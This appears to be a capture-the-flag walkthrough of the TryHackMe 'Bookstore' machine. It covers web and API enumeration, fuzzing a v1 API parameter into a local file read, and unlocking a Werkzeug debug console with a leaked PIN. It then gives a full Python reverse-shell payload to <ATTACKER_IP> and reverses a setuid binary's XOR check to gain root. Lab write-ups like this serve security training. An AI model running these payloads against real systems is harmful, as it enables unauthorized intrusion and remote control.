# [Bookstore](https://tryhackme.com/room/bookstoreoc)

## A Beginner level box with basic web enumeration and REST API Fuzzing.

Bookstore is a boot2root CTF machine that teaches a beginner penetration tester basic web enumeration and REST API Fuzzing. Several hints can be found when enumerating the services, the idea is to understand how a vulnerable API can be exploited, you can contact me on twitter @siddhantc\_ for giving any feedback regarding the machine.

### User flag

1. Start with an nmap scan to identify open ports and running services:

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Use gobuster to discover hidden directories and files on the main web server:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html -t 50
```

**Results:**

```
/index.html           (Status: 200) [Size: 6452]
/images               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/images/]
/login.html           (Status: 200) [Size: 5325]
/books.html           (Status: 200) [Size: 2940]
/assets               (Status: 301) [Size: 315] [--> http://<TARGET_IP>/assets/]
/javascript           (Status: 301) [Size: 319] [--> http://<TARGET_IP>/javascript/]
```

3. Examine the login page source code by visiting `view-source:http://<TARGET_IP>/login.html`. There's an HTML comment that provides a hint:

```html
<!-- Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

4. Enumerate the Python web server running on port 5000:

```bash
gobuster dir -u http://<TARGET_IP>:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
```

5. Visit `http://<TARGET_IP>:5000/api` to view the API documentation:

```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

Notice that the API version is **v2**, but we should also test **v1** for potential vulnerabilities.

6. Use wfuzz to fuzz API parameters and discover potential Local File Inclusion (LFI) vulnerabilities:

```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<TARGET_IP>:5000/api/v1/resources/books?FUZZ=.bash_history --hc 404
```

**Results:**

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000395:   200        7 L      11 W       116 Ch      "show"
000000486:   200        1 L      1 W        3 Ch        "author"
000000529:   200        1 L      1 W        3 Ch        "id"
```

7. Visit `http://<TARGET_IP>:5000/api/v1/resources/books?show=.bash_history` to read sid's bash history:

```bash
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```

8. Navigate to `http://<TARGET_IP>:5000/console` and enter the PIN **123-321-135** to unlock the interactive Python console.

9. On your attacking machine, start a netcat listener:

```bash
nc -lvnp 4444
```

10. In the Werkzeug console, execute the following Python reverse shell payload:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

11. Navigate to sid's home directory and read the user flag:

```bash
cat user.txt
```

[SCREEN01]

---

### Root flag

1. Upgrade to a fully interactive TTY shell for better usability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. Looking around sid's home directory, we find a suspicious binary called `try-harder`. Transfer it to your attacking machine for analysis. First, encode it in base64:

```bash
base64 try-harder | tr -d '\n'
```

3. On your attacking machine, decode and save the binary:

```bash
echo "BASE64_STRING_HERE" | base64 -d > try-harder
```

4. Open the `try-harder` binary in Ghidra and analyze the main function:

```cpp
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

To find `local_1c`, we need to reverse the XOR operation. Since XOR is reversible:

```
local_1c ^ 0x1116 ^ 0x5db3 = 0x5dcd21f4
local_1c = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3

0x5dcd21f4 ^ 0x1116 ^ 0x5db3 = 1573743953
```

The magic number is: **1573743953**

5. Back on the target machine, run the binary with the magic number:

```bash
./try-harder
1573743953
```

6. Verify you have root access and retrieve the root flag:

```bash
whoami
cat /root/root.txt
```

[SCREEN02]
